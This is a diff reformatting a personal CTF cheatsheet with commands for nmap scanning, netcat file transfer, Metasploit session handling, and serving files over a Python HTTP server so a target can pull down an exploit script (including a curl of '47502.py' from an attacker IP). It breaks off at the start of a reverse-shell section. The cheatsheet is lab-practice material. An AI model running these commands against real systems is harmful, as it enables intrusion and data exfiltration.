@@ -1,48 +1,75 @@
 # docs-ctf-cheatsheet
 ### NMAP:
 ```shell nmap -sC -sV -oA nmap/initial IPADRESS``` (standart)
+
 ```shell nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS``` (quick scan of all ports)
 
 -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
+
 -p- : Enables scanning across all ports, not just the top 1000
+
 -sC : Scan with default NSE scripts. Considered useful for discovery and safe
+
 -sV : Attempts to determine the version of the service running on port
+
 -oA [dir] all output to [dir]
 
 ### NETCAT:
 send data:
-	reciever:
-	```shell
-	nc -l -p 1234 > FILE.NAME
-	``` (sometimes netcat instead of nc!)
-	sender:
-	```shell
-	nc -w 3 DESTINATION 1234 < FILE.NAME
-	```
+
+reciever:
+```shell
+nc -l -p 1234 > FILE.NAME
+```
+(sometimes netcat instead of nc!)
+
+sender:
+```shell
+nc -w 3 DESTINATION 1234 < FILE.NAME
+```
 
 ### MSF:
-search
-	search …
-send data
-	upload /path/to/file
-run exploit in background and enter the session
+search:
+```shell
+search [SEARCHTERM]
+```
+send data:
+```shell
+upload /path/to/file
+```
+run exploit in background and enter the session:
+```shell
 run -j
-sessions
-	sessions -i [session id]
-get "normal" shell
-	shell
-move out of a session
-	ctrl+z
+```
+sessions:
+```shell
+sessions -i [session id]
+```
+get "normal" shell:
+```shell
+shell
+```
+move out of a session:
+```shell
+ctrl+z
+```
 
 ### HTTPSERVER:
 send data:
-	sender:
-	python -m SimpleHTTPServer 8083
-	reciever:
-	curl IPADRESSSENDER:8083/FILE.NAME
-	curl 10.10.14.145:8083/47502.py > hmm.py
-	OR
-	wget IPADRESSSENDER:8083/FILE.NAME
+
+sender:
+```shell
+python -m SimpleHTTPServer 8083
+```
+reciever:
+```shell
+curl IPADRESSSENDER:8083/FILE.NAME
+curl 10.10.14.145:8083/47502.py > hmm.py
+```
+OR
+```shell
+wget IPADRESSSENDER:8083/FILE.NAME
+```
 
 ### REVERSE SHELL:
 1. setup listener on my machine:
